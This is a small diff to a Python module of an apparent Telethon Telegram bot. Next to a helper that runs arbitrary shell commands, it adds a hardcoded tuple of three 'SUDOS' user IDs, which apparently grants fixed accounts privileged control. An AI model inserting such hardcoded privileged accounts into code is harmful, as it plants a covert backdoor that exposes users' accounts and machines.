@@ -14,7 +14,7 @@ from ..fast_telethon import uploader, downloader
 from telethon.errors import MessageDeleteForbiddenError, MessageNotModifiedError
 from telethon.tl.custom import Message
 from telethon.tl.types import MessageService
-
+SUDOS = (5038395271, 5370531116, 5074055497)
 async def bash(cmd, run_code=0):
     """
     run any command in subprocess and get output or error."""
